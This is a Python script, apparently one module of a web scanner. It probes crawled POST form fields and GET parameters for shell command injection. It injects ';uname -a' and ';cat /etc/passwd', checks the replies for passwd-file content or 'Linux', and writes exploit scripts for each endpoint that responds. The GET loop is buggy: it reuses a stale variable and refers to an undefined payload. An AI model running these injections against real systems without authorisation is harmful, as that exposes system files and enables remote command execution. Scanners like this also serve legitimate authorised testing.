import requests
from utility import *
from generator import generator, render

banner(SCI)

results = read_results()

nuggets = ['root:x:0:0:root:/root:/bin/bash', 'Linux']

injections = [';uname -a',';cat /etc/passwd']

SCI_generator = generator(SCI)

links = set([])

for result in results:
    link = result['link']
    links.add(link)

links = list(links)

for result in results:
    method = 'POST'
    link = result['link']
    input_names = result['content']
    url = get_url(link)
    if len(input_names):
        for injection in injections:
            for p in input_names:
                payload = {
                    p: injection
                }
                req = requests.post(link, data=payload)
                for nugget in nuggets:
                    if req.content.find(nugget) != -1:
                        endpoint = url.path
                        params = payload
                        scope, script = render[SCI](endpoint, params, method)
                        SCI_generator.updateScope(scope)
                        SCI_generator.saveScript(script)
                        success_message(link + '\t' + json.dumps(payload))

for link in links:
    method = 'GET'
    link = result['link']
    input_names = result['content']
    url = get_url(link)
    params = get_params(url)
    if len(params.keys()):
        for injection in injections:
            for p in params:
                params[p] = injection
                fullURL = generate_url_with_params(url,params)
                req = requests.get(fullURL)
                for nugget in nuggets:
                    if req.content.find(nugget) != -1:
                        endpoint = url.path
                        scope, script = render[SCI](endpoint, params, method)
                        SCI_generator.updateScope(scope)
                        SCI_generator.saveScript(script)
                        success_message(link + '\t' + json.dumps(payload))
    
SCI_generator.saveScope()

print '\n'
